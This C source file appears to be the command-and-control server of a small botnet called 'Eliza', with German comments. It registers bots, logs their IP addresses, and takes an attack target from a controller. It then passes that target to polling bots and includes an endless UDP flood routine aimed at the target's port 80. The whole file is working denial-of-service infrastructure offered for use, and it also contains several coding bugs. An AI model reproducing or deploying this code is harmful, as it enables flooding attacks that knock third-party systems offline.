#include "eliza.h"

#define MAXLINE 1024

int server_socket, dyn_socket;
int laenge, anzahl;
struct sockaddr_in serverinfo, clientinfo;
char clientAntwort[65000];
char antwort[65000] = "no answer was created!";
char clientIps[1000][1000];
int counter = 0;
int attackMode = 0;
unsigned short int port = 5003;
char server_ip[] = "INADDR_ANY";
//char server_ip[] = "81.169.214.173";
char client_ip[INET_ADDRSTRLEN];

void showElizaLogo() {
     printf("  ________    _         _         _________             _   __     __\n");
     printf(" /_  __/ /_  (_)____   (_)____   / ____/ (_)___  ____ _/ | / /__  / /_\n");
     printf("  / / / __ \\/ / ___/  / / ___/  / __/ / / /_  / / __ `/  |/ / _ \\/ __/\n");
     printf(" / / / / / / (__  )  / (__  )  / /___/ / / / /_/ /_/ / /|  /  __/ /_\n");
     printf("/_/ /_/ /_/_/____/  /_/____/  /_____/_/_/ /___/\\__,_/_/ |_/\\___/\\__/\n");
     printf("By Gespelor\n\n\n");
}

void simpleListenTcp(char ip_adresse[], unsigned short int port, char befehl[], int size_befehl, char * antwort) {
     int socketnr;
     int laenge;
     int anzahl;
     int socketErgebnis;
     struct sockaddr_in adresse;
     char *empfangene_zeichen = calloc(65000, sizeof(char*));

     socketnr = socket(AF_INET, SOCK_STREAM, 0);

     adresse.sin_family = AF_INET;
     inet_pton(AF_INET,ip_adresse,&adresse.sin_addr.s_addr);
     adresse.sin_port = htons(port);
     laenge = sizeof(adresse);

     socketErgebnis = connect(socketnr,(struct sockaddr *)&adresse, laenge);

     if(socketErgebnis == -1) {
          perror("Konnte keine Verbindung herstellen: ");
     }
     else {
          write(socketnr, befehl, size_befehl);
          anzahl = read(socketnr, empfangene_zeichen, sizeof(empfangene_zeichen));
          empfangene_zeichen[anzahl] = '\0';
     }
     close(socketnr);
     strcpy(antwort, empfangene_zeichen);
     free(empfangene_zeichen);
}

void startUDPFlood(char target[]) {
     int sockfd;
     char buffer[MAXLINE];
     char *hello = "Eliza says hello, friend.";
     struct sockaddr_in     servaddr;

     if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
          perror("socket creation failed");
          exit(EXIT_FAILURE);
     }

     memset(&servaddr, 0, sizeof(servaddr));

     servaddr.sin_family = AF_INET;
     servaddr.sin_port = htons(80);
     servaddr.sin_addr.s_addr = inet_addr(target);

     int n, len;
     while(1) {
          sendto(sockfd, (const char *)hello, strlen(hello),
          MSG_CONFIRM, (const struct sockaddr *) &servaddr,
          sizeof(servaddr));
          printf("Hello message sent.\n");
     }

     close(sockfd);
}

void append(char* s, char c)
{
        int len = strlen(s);
        s[len] = c;
        s[len+1] = '\0';
}

void writeToFile(char name[], char text[]) {
     FILE *fp;
     fp = fopen(name, "a");
     fputs(text, fp);
     fclose(fp);
}
void parseClientData(char input[]) {
     if(input[0] == 'a') { //Attack Signal vom Kopf
          char target[255];
          for(int i = 1; i < strlen(input)-1; i++) {
               if(input[i] == '!') {
                    printf("CALL!!");
                    break;
               }
               target[i-1] = input[i];
          }
          printf("Target is %s\n", target);
          writeToFile("target.ez", target);
          attackMode = 1;
          strcpy(antwort, "I will spread the word. Target will be down in a second......\n");
     }
     else if(input[0] == 'r') { //Kopf meldet sich an
          strcpy(antwort, "Hello Master. Give me your commands!");
          printf("IP address is: %s\n", inet_ntoa(clientinfo.sin_addr));
          printf("Elizas Head said hi!\n");
     }
     else if(input[0] == 't') { //Bot fragt nach arbeit
          if(attackMode == 0) {
               strcpy(antwort, "Hibot.");
          }
          if(attackMode == 1) {
               FILE *fileStream; char fileText [100];
               fileStream = fopen ("target.ez", "r");
               fgets (fileText, 100, fileStream);
               fclose(fileStream);
               antwort[0] = "a";
               strcpy(antwort, fileText);
               strcat(antwort, "!");
          }
          struct sockaddr_in* pV4Addr = (struct sockaddr_in*)&clientinfo;
          struct in_addr ipAddr = pV4Addr->sin_addr;
          char str[INET_ADDRSTRLEN];
          inet_ntop( AF_INET, &ipAddr, str, INET_ADDRSTRLEN);
          strcpy(clientIps[0+counter], str);
          counter++;
          printf("A bot said hi. He has the IP: %s\n", str);
          writeToFile("bots.ez", str);
     }
     else if(input[0] == 'p') { //Attacke stoppen
          attackMode = 0;
          printf("Attack mode was reset!!\n");
          strcpy(antwort, "Attack was stopped!\n");
     }
     else if(input[0] == 's') { //Server herunterfahren
          strcpy(antwort, "Shutting me down now...");
          write(dyn_socket, antwort, sizeof(antwort));
          printf("Shutdown is imminent...\n");
          close(server_socket);
          close(dyn_socket);
          exit(0);
     }
     else if(input[0] == 'b') { //Botliste ausgeben
          for(int i = 0; i < counter; i++) {
               printf("Bot No. %d with the IP: %s\n", i, clientIps[i]);
          }
     }
     else {
          strcpy(antwort, "Unkown command recieved from you...\n");
     }
}

void startElizaServer() {
     server_socket = socket(AF_INET, SOCK_STREAM, 0);

     serverinfo.sin_family = AF_INET;
     serverinfo.sin_addr.s_addr = htonl(INADDR_ANY);
     serverinfo.sin_port = htons(port);
     laenge = sizeof(serverinfo);

     bind(server_socket, (struct sockaddr *)&serverinfo, laenge);
     listen(server_socket, 3);

     while(1) {
          dyn_socket = accept(server_socket, (struct sockaddr *)&clientinfo, &laenge);
          inet_ntop(AF_INET, &clientinfo.sin_addr.s_addr, client_ip, INET_ADDRSTRLEN);
          anzahl = read(dyn_socket, clientAntwort, sizeof(clientAntwort));
          clientAntwort[anzahl] = '\0';
          parseClientData(clientAntwort);
          write(dyn_socket, antwort, sizeof(antwort));
          close(dyn_socket);
     }
}
